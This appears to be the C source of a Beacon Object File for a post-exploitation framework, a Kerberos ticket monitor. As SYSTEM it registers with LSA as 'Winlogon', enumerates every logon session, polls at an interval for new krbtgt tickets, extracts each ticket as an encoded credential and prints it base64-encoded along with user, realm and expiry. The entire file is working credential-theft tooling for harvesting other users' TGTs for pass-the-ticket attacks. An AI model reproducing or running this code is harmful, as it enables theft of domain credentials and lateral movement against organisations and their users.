#include <windows.h>

void printoutput(BOOL done);
#include "../_include/base.c"

#define SECURITY_WIN32
#include <ntsecapi.h>
#include <ntstatus.h>

DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaRegisterLogonProcess(PLSA_STRING LogonProcessName, PHANDLE LsaHandle, PLSA_OPERATIONAL_MODE SecurityMode);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaGetLogonSessionData(PLUID LogonId, PSECURITY_LOGON_SESSION_DATA* ppLogonSessionData);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaEnumerateLogonSessions(PULONG LogonSessionCount, PLUID* LogonSessionList);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaFreeReturnBuffer(PVOID Buffer);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaDeregisterLogonProcess(HANDLE LsaHandle);

// ADVAPI32 imports
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID* pSid);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$EqualSid(PSID pSid1, PSID pSid2);
DECLSPEC_IMPORT PVOID WINAPI ADVAPI32$FreeSid(PSID pSid);

// KERNEL32 extras
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME*, LPSYSTEMTIME);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);

// -----------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------
#define MAX_SNAPSHOT 512

typedef struct {
    char keys[MAX_SNAPSHOT][320];
    int  count;
} TICKET_SNAPSHOT;

static int my_isdigit(int c) { return (c >= '0' && c <= '9'); }
static int my_islower(int c) { return (c >= 'a' && c <= 'z'); }

static int my_strncmp_local(const char* s1, const char* s2, int len) {
    int i = 0;
    while (s1[i] && s1[i] == s2[i] && i < len) i++;
    return (i == len) ? 0 : (int)((unsigned char)s1[i] - (unsigned char)s2[i]);
}

static int my_strcmp_local(const char* s1, const char* s2) {
    while (*s1 && *s1 == *s2) { s1++; s2++; }
    return (int)((unsigned char)*s1 - (unsigned char)*s2);
}

static long int my_strtol(const char* str, int base) {
    long int result = 0;
    int sign = 1;
    if (*str == '-' || *str == '+') { sign = (*str == '-') ? -1 : 1; str++; }
    while (my_isdigit(*str) ||
           (base == 16 && ((*str >= 'a' && *str <= 'f') || (*str >= 'A' && *str <= 'F')))) {
        int digit = my_isdigit(*str) ? (*str - '0')
                  : (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        if (digit >= base) break;
        result = result * base + digit;
        str++;
    }
    return result * sign;
}

static void wide_to_narrow(UNICODE_STRING us, char* out, int outLen) {
    int chars = us.Length / 2;
    if (chars >= outLen) chars = outLen - 1;
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, us.Buffer, chars, out, outLen, NULL, NULL);
    out[chars] = '\0';
}

static int snapshot_contains(TICKET_SNAPSHOT* snap, const char* key) {
    for (int i = 0; i < snap->count; i++)
        if (my_strcmp_local(snap->keys[i], key) == 0) return 1;
    return 0;
}

static void snapshot_add(TICKET_SNAPSHOT* snap, const char* key) {
    if (snap->count >= MAX_SNAPSHOT) return;
    int i = 0;
    while (key[i] && i < 319) { snap->keys[snap->count][i] = key[i]; i++; }
    snap->keys[snap->count][i] = '\0';
    snap->count++;
}

static void build_key(const char* svcName, LUID luid, char* key, int keyLen) {
    int k = 0;
    while (svcName[k] && k < keyLen - 20) { key[k] = svcName[k]; k++; }
    key[k++] = ':';
    ULONG lo = luid.LowPart;
    for (int b = 28; b >= 0; b -= 4) {
        int n = (lo >> b) & 0xF;
        key[k++] = n < 10 ? '0' + n : 'a' + (n - 10);
    }
    key[k] = '\0';
}

static char* b64_encode(BYTE* input, size_t input_len) {
    const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t out_len = 4 * ((input_len + 2) / 3);
    BYTE* out = (BYTE*)intAlloc(out_len + 1);
    if (!out) return NULL;
    size_t i = 0, j = 0;
    while (i < input_len) {
        UINT a = i < input_len ? input[i++] : 0;
        UINT b = i < input_len ? input[i++] : 0;
        UINT c = i < input_len ? input[i++] : 0;
        UINT t = (a << 16) + (b << 8) + c;
        out[j++] = b64chars[(t >> 18) & 0x3F];
        out[j++] = b64chars[(t >> 12) & 0x3F];
        out[j++] = b64chars[(t >>  6) & 0x3F];
        out[j++] = b64chars[(t >>  0) & 0x3F];
    }
    if (input_len % 3 == 1) { out[out_len-1] = '='; out[out_len-2] = '='; }
    else if (input_len % 3 == 2) { out[out_len-1] = '='; }
    out[out_len] = '\0';
    return (char*)out;
}

// -----------------------------------------------------------------------
// IsSystem / GetCurrentToken / GetLsaHandle
// -----------------------------------------------------------------------
static BOOL IsSystem(void) {
    HANDLE hToken = NULL;
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    if (!ADVAPI32$OpenThreadToken((HANDLE)(LONG_PTR)-2, TOKEN_QUERY, TRUE, &hToken)) {
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            ADVAPI32$OpenProcessToken((HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &hToken);
    }
    if (!hToken) return FALSE;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser))
        goto done;
    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID,
            0,0,0,0,0,0,0, &pSystemSid))
        goto done;
    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);
    ADVAPI32$FreeSid(pSystemSid);
done:
    return bSystem;
}

static BOOL GetLsaHandle(BOOL highIntegrity, HANDLE* hLsa) {
    ULONG mode = 0;
    NTSTATUS status;
    if (highIntegrity) {
        LSA_STRING lsaStr = { 8, 9, "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaStr, hLsa, &mode);
    } else {
        status = SECUR32$LsaConnectUntrusted(hLsa);
    }
    return (status == 0);
}

// -----------------------------------------------------------------------
// ExtractTicket
// -----------------------------------------------------------------------
static BOOL ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid,
                           UNICODE_STRING targetName,
                           BYTE** ticket, int* ticketSize) {
    ULONG reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + targetName.MaximumLength;
    KERB_RETRIEVE_TKT_REQUEST* req = (KERB_RETRIEVE_TKT_REQUEST*)intAlloc(reqSize);
    if (!req) return FALSE;

    req->MessageType    = KerbRetrieveEncodedTicketMessage;
    req->LogonId        = luid;
    req->TicketFlags    = 0;
    req->CacheOptions   = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    req->EncryptionType = 0;
    req->TargetName     = targetName;
    req->TargetName.Buffer = (PWSTR)((PBYTE)req + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(req->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);

    KERB_RETRIEVE_TKT_RESPONSE* resp = NULL;
    ULONG respSize = reqSize;
    NTSTATUS protStatus;
    BOOL status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, req, reqSize,
        (PVOID*)&resp, &respSize, &protStatus);

    intFree(req);

    BOOL ok = FALSE;
    if (!status && !protStatus && respSize > 0) {
        ULONG sz = resp->Ticket.EncodedTicketSize;
        *ticket = (BYTE*)intAlloc(sz);
        if (*ticket) {
            MSVCRT$memcpy(*ticket, resp->Ticket.EncodedTicket, sz);
            *ticketSize = (int)sz;
            ok = TRUE;
        }
    }
    if (resp) SECUR32$LsaFreeReturnBuffer(resp);
    return ok;
}

static void ScanAndReport(HANDLE hLsa, ULONG authPackage, BOOL highIntegrity,
                          TICKET_SNAPSHOT* snap, BOOL firstRun) {
    ULONG sessionCount = 0;
    PLUID sessionList  = NULL;

    if (SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList) != 0)
        return;

    for (ULONG i = 0; i < sessionCount; i++) {
        LUID luid = sessionList[i];

        KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
        cacheReq.MessageType = KerbQueryTicketCacheExMessage;
        cacheReq.LogonId     = highIntegrity ? luid : (LUID){0};

        KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResp = NULL;
        ULONG respSize  = 0;
        NTSTATUS protStatus;

        if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage,
                &cacheReq, sizeof(cacheReq),
                (PVOID*)&cacheResp, &respSize, &protStatus) != 0)
            continue;
        if (!cacheResp) continue;

        for (ULONG j = 0; j < cacheResp->CountOfTickets; j++) {
            KERB_TICKET_CACHE_INFO_EX* ti = &cacheResp->Tickets[j];

            char svcName[256] = {0};
            wide_to_narrow(ti->ServerName, svcName, sizeof(svcName));
            if (my_strncmp_local(svcName, "krbtgt", 6) != 0) continue;

            char key[320] = {0};
            build_key(svcName, luid, key, sizeof(key));
            if (snapshot_contains(snap, key)) continue;
            snapshot_add(snap, key);
            if (firstRun) continue;

            // Nuevo TGT — reportar
            char clientName[256]  = {0};
            char clientRealm[256] = {0};
            char svcRealm[256]    = {0};
            wide_to_narrow(ti->ClientName,  clientName,  sizeof(clientName));
            wide_to_narrow(ti->ClientRealm, clientRealm, sizeof(clientRealm));
            wide_to_narrow(ti->ServerRealm, svcRealm,    sizeof(svcRealm));

            FILETIME ft;
            SYSTEMTIME st;
            ft.dwHighDateTime = ti->EndTime.HighPart;
            ft.dwLowDateTime  = ti->EndTime.LowPart;
            KERNEL32$FileTimeToSystemTime(&ft, &st);

            internal_printf("\n[+] New TGT detected!\n");
            internal_printf("    User    : %s @ %s\n", clientName, clientRealm);
            internal_printf("    Service : %s @ %s\n", svcName, svcRealm);
            internal_printf("    Expires : %02d.%02d.%04d %02d:%02d:%02d UTC\n",
                st.wDay, st.wMonth, st.wYear,
                st.wHour, st.wMinute, st.wSecond);
            internal_printf("    LUID    : %lx:0x%lx\n",
                (unsigned long)luid.HighPart, (unsigned long)luid.LowPart);

            BYTE* rawTicket = NULL;
            int   rawSize   = 0;
            if (ExtractTicket(hLsa, authPackage, luid, ti->ServerName,
                              &rawTicket, &rawSize)) {
                char* b64 = b64_encode(rawTicket, rawSize);
                if (b64) {
                    internal_printf("    Ticket  :\n    %s\n", b64);
                    intFree(b64);
                }
                intFree(rawTicket);
            }
            printoutput(FALSE);
        }

        SECUR32$LsaFreeReturnBuffer(cacheResp);
    }

    SECUR32$LsaFreeReturnBuffer(sessionList);
}

// -----------------------------------------------------------------------
// Entry point
// -----------------------------------------------------------------------
void go(char* args, int len) {
    bofstart();

    datap parser;
    BeaconDataParse(&parser, args, len);

    int param_len = 0;
    char* params = BeaconDataExtract(&parser, &param_len);

    int intervalSec = 30;

    // Parsear /interval:
    if (params && param_len > 0) {
        char* p = params;
        while (*p) {
            if (my_strncmp_local(p, "/interval:", 10) == 0) {
                intervalSec = (int)my_strtol(p + 10, 10);
                if (intervalSec <= 0) intervalSec = 30;
            }
            p++;
        }
    }

    BOOL highIntegrity = IsSystem();

    HANDLE hLsa = NULL;
    if (!GetLsaHandle(highIntegrity, &hLsa)) {
        internal_printf("[-] Failed to get LSA handle\n");
        printoutput(TRUE);
        bofstop();
        return;
    }

    LSA_STRING krbAuth = { 8, 9, "kerberos" };
    ULONG authPackage  = 0;
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) != 0) {
        internal_printf("[-] Failed to find Kerberos auth package\n");
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        printoutput(TRUE);
        bofstop();
        return;
    }

    internal_printf("\n[*] Kerberos Monitor started\n");
    internal_printf("    Interval : %d sec\n", intervalSec);
    internal_printf("    Watching for new TGTs...\n\n");
    printoutput(FALSE);

    // Snapshot en heap — sin variables globales
    TICKET_SNAPSHOT* snap = (TICKET_SNAPSHOT*)intAlloc(sizeof(TICKET_SNAPSHOT));
    if (!snap) {
        internal_printf("[-] Failed to allocate snapshot\n");
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        printoutput(TRUE);
        bofstop();
        return;
    }
    snap->count = 0;

    // Baseline silencioso
    ScanAndReport(hLsa, authPackage, highIntegrity, snap, TRUE);

    DWORD intervalMs = (DWORD)intervalSec * 1000;

    while (1) {
        KERNEL32$Sleep(intervalMs);
        ScanAndReport(hLsa, authPackage, highIntegrity, snap, FALSE);
    }

    intFree(snap);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
    bofstop();
}
